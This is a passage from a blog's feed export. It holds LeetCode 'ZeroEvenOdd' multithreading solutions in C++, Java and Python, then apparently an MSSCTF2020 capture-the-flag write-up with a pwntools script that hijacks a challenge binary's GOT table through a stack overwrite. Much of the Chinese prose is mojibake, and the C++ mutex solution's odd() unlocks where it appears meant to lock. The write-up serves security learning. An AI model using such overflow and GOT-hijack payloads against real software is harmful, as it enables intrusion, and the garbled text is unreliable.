</span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_wait(&amp;sem_zero);</span><br><span class="line">            printNumber(0);</span><br><span class="line">            if(i % 2)</span><br><span class="line">                sem_post(&amp;sem_even);</span><br><span class="line">            else</span><br><span class="line">                sem_post(&amp;sem_odd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void even(function&lt;void(int)&gt; printNumber) </span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=2;i&lt;=n;i+=2)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_wait(&amp;sem_even);</span><br><span class="line">            printNumber(i);</span><br><span class="line">            sem_post(&amp;sem_zero);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void odd(function&lt;void(int)&gt; printNumber) </span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=1;i&lt;=n;i+=2)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_wait(&amp;sem_odd);</span><br><span class="line">            printNumber(i);</span><br><span class="line">            sem_post(&amp;sem_zero);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/DLtsGHlIywMAgWi.png" alt="image.png"></p><h4 id="Javaç‰ˆ-2"><a href="#Javaç‰ˆ-2" class="headerlink" title="Javaç‰ˆ"></a>Javaç‰ˆ</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.Semaphore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroEvenOdd</span> </span><br><span class="line">&#123;</span><br><span class="line">    Semaphore sem_even, sem_odd, sem_zero;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ZeroEvenOdd</span><span class="params">(<span class="type">int</span> n)</span> </span><br><span class="line">    &#123;</span><br><span class="line">        sem_zero = <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">1</span>);</span><br><span class="line">        sem_even = <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">        sem_odd = <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber.accept(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">zero</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_zero.acquire();</span><br><span class="line">            printNumber.accept(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">                sem_even.release();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                sem_odd.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">even</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_even.acquire();</span><br><span class="line">            printNumber.accept(i);</span><br><span class="line">            sem_zero.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">odd</span><span class="params">(IntConsumer printNumber)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sem_odd.acquire();</span><br><span class="line">            printNumber.accept(i);</span><br><span class="line">            sem_zero.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/8IYZ7FcrdK4LQlw.png" alt="image.png"></p><h4 id="Pythonç‰ˆ-2"><a href="#Pythonç‰ˆ-2" class="headerlink" title="Pythonç‰ˆ"></a>Pythonç‰ˆ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Semaphore</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroEvenOdd</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n</span>):</span><br><span class="line">        self.n = n</span><br><span class="line">        self.sem_zero = Semaphore(<span class="number">1</span>)</span><br><span class="line">        self.sem_odd = Semaphore(<span class="number">0</span>)</span><br><span class="line">        self.sem_even = Semaphore(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment"># printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">zero</span>(<span class="params">self, printNumber: <span class="string">&#x27;Callable[[int], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,self.n):</span><br><span class="line">            self.sem_zero.acquire()</span><br><span class="line">            printNumber(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                self.sem_odd.release()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.sem_even.release()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">even</span>(<span class="params">self, printNumber: <span class="string">&#x27;Callable[[int], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,self.n+<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">            self.sem_even.acquire()</span><br><span class="line">            printNumber(i)</span><br><span class="line">            self.sem_zero.release()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">odd</span>(<span class="params">self, printNumber: <span class="string">&#x27;Callable[[int], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,self.n+<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">            self.sem_odd.acquire()</span><br><span class="line">            printNumber(i)</span><br><span class="line">            self.sem_zero.release()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/TN1IJ3p8zvYfQV9.png" alt="image.png"></p><h3 id="è§£æ³•äºŒï¼šäº’æ–¥é”-1"><a href="#è§£æ³•äºŒï¼šäº’æ–¥é”-1" class="headerlink" title="è§£æ³•äºŒï¼šäº’æ–¥é”"></a>è§£æ³•äºŒï¼šäº’æ–¥é”</h3><p>ä¾ç„¶å¯ä»¥ç”¨äº’æ–¥é”æ¥è§£å†³è¿™ä¸ªé—®é¢˜</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><h4 id="C-ç‰ˆ-3"><a href="#C-ç‰ˆ-3" class="headerlink" title="C++ç‰ˆ"></a>C++ç‰ˆ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZeroEvenOdd</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    std::mutex lock_zero, lock_odd, lock_even;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ZeroEvenOdd</span>(<span class="type">int</span> n) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;n = n;</span><br><span class="line">        lock_zero.<span class="built_in">unlock</span>();</span><br><span class="line">        lock_odd.<span class="built_in">lock</span>();</span><br><span class="line">        lock_even.<span class="built_in">lock</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printNumber(x) outputs &quot;x&quot;, where x is an integer.</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">zero</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            lock_zero.<span class="built_in">lock</span>();</span><br><span class="line">            <span class="built_in">printNumber</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span>)</span><br><span class="line">                lock_even.<span class="built_in">unlock</span>();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                lock_odd.<span class="built_in">unlock</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">even</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            lock_even.<span class="built_in">lock</span>();</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            lock_zero.<span class="built_in">unlock</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">odd</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt; printNumber)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            lock_odd.<span class="built_in">unlock</span>();</span><br><span class="line">            <span class="built_in">printNumber</span>(i);</span><br><span class="line">            lock_zero.<span class="built_in">unlock</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/Vkl13wLKMpEgH98.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;è™½ç„¶è¯´å¾ˆä¹…ä»¥å‰å·²ç»â€œå­¦è¿‡äº†â€œå¤šçº¿ç¨‹çš„å†…å®¹ï¼Œä½†æ˜¯å…¶å®è¿˜æ˜¯ä¸€çŸ¥åŠè§£XDï¼ˆå…¶å®æ˜¯ä¸€ç‚¹éƒ½ä¸æ‡‚å¤šçº¿ç¨‹ï¼ˆè™½ç„¶è¯´å†™è¿‡å‡ ä¸ªç®€å•çš„å¤šçº¿ç¨‹çš„åº”ç”¨å°ç¨‹åºï¼ˆğŸ‘ˆé‚£åªæ˜¯Javaä½œä¸šçš„ç¨‹åº¦å•Šå–‚ï¼ˆğŸ‘ˆæ²¡æœ‰ç”¨å¿ƒå­¦ä¹ çš„å±‘&lt;/p&gt;
&lt;p&gt;æ€æ¥æƒ³å»è¿˜æ˜¯å¾—é leetcodeæ¥å·©å›ºåŸºç¡€çŸ¥è¯†å•Šï¼ˆx&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è™½ç„¶è¯´é¢˜ç›®æŒºå°‘â€¦â€¦&lt;del&gt;ä¸è¿‡ä¹Ÿå‡‘åˆå‡‘åˆåˆ·åˆ·&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;å…¶å®ç›¯ä¸Šçš„å°±æ˜¯é¢˜ç›®å°‘çš„é¢˜åº“&lt;/del&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="é¢˜è§£" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="Python" scheme="http://archive.next.arttnba3.cn/tags/Python/"/>
    
    <category term="Java" scheme="http://archive.next.arttnba3.cn/tags/Java/"/>
    
    <category term="å¤šçº¿ç¨‹" scheme="http://archive.next.arttnba3.cn/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFé¢˜è§£-0x05ã€‘MSSCTF2020-write-up-by-arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/19/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91MSSCTF2020-write-up-by-arttnb3-md/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/19/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91MSSCTF2020-write-up-by-arttnb3-md/</id>
    <published>2020-09-19T11:45:24.000Z</published>
    <updated>2021-01-22T15:09:20.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>MSSCTFå³<strong>å…¨å›½ä¸­å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›</strong>ï¼Œæ˜¯ç”±è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦ä¸¾åŠçš„ã€é¢å‘å…¨å›½ä¸­å­¦ç”Ÿçš„ä¿¡æ¯å®‰å…¨ç«èµ›ï¼Œæ¯”èµ›ä¸ºé‡‡ç”¨çº¿ä¸Š<strong>è§£é¢˜æ¨¡å¼</strong>ï¼ˆ<strong>Jeopardy</strong>ï¼‰çš„CTF</p><p>ç”±äºä»Šå¹´ç–«æƒ…åŸå› ï¼Œæ¯”èµ›å…¨ç¨‹åœ¨çº¿ä¸Šå¼€åŠï¼Œä¸€å¿ƒæƒ³ä¸ºå­¦æ ¡åšè´¡çŒ®ï¼ˆ<del>åªæ˜¯æƒ³è¹­é¥­</del>ï¼‰çš„æˆ‘ä¹Ÿä½œä¸ºå¿—æ„¿è€…å‚ä¸äº†æ¯”èµ›ç›‘è€ƒçš„å…¨è¿‡ç¨‹ï¼ˆ<del>æœ¬æ¥æƒ³å‡ºé¢˜çš„ï¼Œä½†æ˜¯å’Œä¸­å­¦ç”Ÿå·¨çŠ‡æ¯”èµ·æ¥æˆ‘è¿˜æ˜¯å¤ªèœle</del></p><p>ä»¥ä¸‹æ˜¯æˆ‘è‡ªå·±çš„èµ›åå¤ç›˜</p><blockquote><p>æ³¨ï¼šæ‰€æœ‰çš„é¢˜ç›®ç¯å¢ƒéƒ½å·²åœ¨<a href="https://archive.lctf.online/">archive.lctf.online</a>ä¸Šæœ‰ä¸€ä»½</p><p>ä»¥åŠè¿™æ¬¡mssctfåªæœ‰ä¸€ä¸ªäººåšå‡ºpwné¢˜ï¼Œè€Œä¸”è¿˜æ˜¯akâ€¦â€¦ä¸­å­¦ç”Ÿææ€–å¦‚æ–¯â€¦â€¦</p></blockquote><span id="more"></span><h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="0x00-Wal1et-gotè¡¨åŠ«æŒ"><a href="#0x00-Wal1et-gotè¡¨åŠ«æŒ" class="headerlink" title="0x00.Wal1et - gotè¡¨åŠ«æŒ"></a>0x00.Wal1et - gotè¡¨åŠ«æŒ</h2><p><a href="/download/mssctf2020/wallet/Wal1et" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-Wal1et</a> </p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤å’Œcanary</p><p><img src="https://i.loli.net/2020/09/20/WCOR8bqNkMHhjf4.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/20/Spw4rA7CvP9LIc5.png" alt="image.png"></p><p>mainå‡½æ•°ä¸­è°ƒç”¨äº†<code>begin()</code>å’Œ<code>check()</code>ä¸¤ä¸ªå‡½æ•°ï¼Œä¸Šå›¾æˆ‘ä»¬å®¹æ˜“çœ‹å‡º<strong>ä¸¤å‡½æ•°çš„æ ˆå¸§çš„åŸºå€åº”å½“ç›¸åŒ</strong></p><p><img src="https://i.loli.net/2020/09/20/97sjHifVQdlDPEu.png" alt="image.png"></p><p>åœ¨<code>begin()</code>å‡½æ•°ä¸­å¯ä»¥è¯»å…¥æœ€å¤§108ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æº¢å‡ºéœ€è¦è‡³å°‘0x78å­—èŠ‚æ‰èƒ½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼ŒåŒæ—¶è¯¥ç¨‹åºä¹Ÿå¼€äº†canary</p><p><img src="https://i.loli.net/2020/09/20/wlXBaQ3NW9eSqus.png" alt="image.png"></p><p>åŒæ ·çš„æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨<code>check()</code>å‡½æ•°ä¸­ä½¿ç”¨äº†<code>scanf()</code>ï¼Œä½†æ˜¯æ²¡ç»™åé¢çš„å‚æ•°ï¼Œè€ƒè™‘åˆ°å¯èƒ½æ˜¯çœŸçš„æ²¡æœ‰ä¹Ÿå¯èƒ½æ˜¯IDAè®¤ä¸å‡ºæ¥ï¼Œæ•…å°è¯•åˆ†ææ±‡ç¼–ä»£ç </p><p><img src="https://i.loli.net/2020/09/20/TrKLWjF8ualZRcp.png" alt="image.png"></p><p>ä¸¤æ¬¡è°ƒç”¨<code>scanf()</code>å‰åˆ†åˆ«å°†<code>v1</code>ã€<code>v2</code>å‹å…¥æ ˆä¸­ï¼Œå³æœ¬è´¨ä¸Šæ˜¯<code>scanf(&quot;%d&quot;,v1)</code>ä¸<code>scanf(&quot;%d&quot;,v2)</code>ï¼Œè¿™é‡Œå°†<code>v1</code>ä¸<code>v2</code>éƒ½å½“æˆäº†ä¸€ä¸ªåœ°å€å¹¶å°è¯•å‘ä¸Šé¢å†™å…¥æ•°æ®</p><p>å‰é¢æˆ‘ä»¬è§‚å¯Ÿåˆ°è¿™ä¸¤ä¸ªå‡½æ•°<strong>å¤ç”¨åŒä¸€ä¸ªæ ˆç©ºé—´</strong>ï¼ŒåŒæ—¶åœ¨<code>begin()</code>ä¸­æ‰€è¯»å–çš„å­—èŠ‚æ•°é‡è¶³å¤Ÿè¦†å†™<code>check()</code>ä¸­çš„<code>v1</code>ï¼Œæ•…è€ƒè™‘å°†v1è¦†å†™ä¸ºåé¢ä¼šè°ƒç”¨åˆ°çš„æŸå‡½æ•°çš„gotè¡¨åœ°å€ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¯»å…¥æ—¶è¯»å…¥ä¸€ä¸ªå¯ä»¥è·å¾—flagçš„åœ°å€ï¼Œè¿™æ ·ä¼šè¦†å†™æ‰gotè¡¨ä¸­åŸå‡½æ•°çš„åœ°å€ï¼›å½“åé¢è¿è¡Œåˆ°é‚£ä¸ªå‡½æ•°æ—¶ï¼Œç¨‹åºä¼šè·³è½¬åˆ°æˆ‘ä»¬æ‰€è¾“å…¥çš„é‚£ä¸ªåœ°å€ä¸Šï¼Œè¾“å‡ºflagï¼Œå³<strong>gotè¡¨åŠ«æŒ</strong></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./Wal1et&#x27;</span>)</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">call_sys = <span class="number">0x08048730</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span>+p32(puts_got)</span><br><span class="line">payload2 = <span class="built_in">str</span>(call_sys).encode()</span><br><span class="line"></span><br><span class="line">p =process(<span class="string">&#x27;./Wal1et&#x27;</span>)<span class="comment">#remote(&#x27;pwn.challenge.lctf.online&#x27;,10008)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¯è·å¾—flag</p><p><img src="https://i.loli.net/2020/09/20/CnhPq8QiNGkZH4e.png" alt="image.png"></p><blockquote><p>è¯´å®è¯æˆ‘æ˜¯æ²¡æƒ³åˆ°è¿‡å±…ç„¶å¯ä»¥è¿™ä¹ˆåˆ©ç”¨çš„ï¼ŒğŸ§yyds</p></blockquote><h2 id="0x01-fishing-master"><a href="#0x01-fishing-master" class="headerlink" title="0x01.fishing master"></a>0x01.fishing master</h2><blockquote><p> å…ˆå’•å’•å’•</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;MSSCTFå³&lt;strong&gt;å…¨å›½ä¸­å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›&lt;/strong&gt;ï¼Œæ˜¯ç”±è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦ä¸¾åŠçš„ã€é¢å‘å…¨å›½ä¸­å­¦ç”Ÿçš„ä¿¡æ¯å®‰å…¨ç«èµ›ï¼Œæ¯”èµ›ä¸ºé‡‡ç”¨çº¿ä¸Š&lt;strong&gt;è§£é¢˜æ¨¡å¼&lt;/strong&gt;ï¼ˆ&lt;strong&gt;Jeopardy&lt;/strong&gt;ï¼‰çš„CTF&lt;/p&gt;
&lt;p&gt;ç”±äºä»Šå¹´ç–«æƒ…åŸå› ï¼Œæ¯”èµ›å…¨ç¨‹åœ¨çº¿ä¸Šå¼€åŠï¼Œä¸€å¿ƒæƒ³ä¸ºå­¦æ ¡åšè´¡çŒ®ï¼ˆ&lt;del&gt;åªæ˜¯æƒ³è¹­é¥­&lt;/del&gt;ï¼‰çš„æˆ‘ä¹Ÿä½œä¸ºå¿—æ„¿è€…å‚ä¸äº†æ¯”èµ›ç›‘è€ƒçš„å…¨è¿‡ç¨‹ï¼ˆ&lt;del&gt;æœ¬æ¥æƒ³å‡ºé¢˜çš„ï¼Œä½†æ˜¯å’Œä¸­å­¦ç”Ÿå·¨çŠ‡æ¯”èµ·æ¥æˆ‘è¿˜æ˜¯å¤ªèœle&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯æˆ‘è‡ªå·±çš„èµ›åå¤ç›˜&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ³¨ï¼šæ‰€æœ‰çš„é¢˜ç›®ç¯å¢ƒéƒ½å·²åœ¨&lt;a href=&quot;https://archive.lctf.online/&quot;&gt;archive.lctf.online&lt;/a&gt;ä¸Šæœ‰ä¸€ä»½&lt;/p&gt;
&lt;p&gt;ä»¥åŠè¿™æ¬¡mssctfåªæœ‰ä¸€ä¸ªäººåšå‡ºpwné¢˜ï¼Œè€Œä¸”è¿˜æ˜¯akâ€¦â€¦ä¸­å­¦ç”Ÿææ€–å¦‚æ–¯â€¦â€¦&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFèµ„æ–™-0x0001ã€‘moeCTF2020-Pwnä»å…¥é—¨åˆ°å…¥ç‹± by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/17/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0001%E3%80%91moeCTF2020-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1%20by%20arttnba3/</id>
    <published>2020-09-17T14:19:20.000Z</published>
    <updated>2020-11-28T08:55:34.439Z</updated>
    
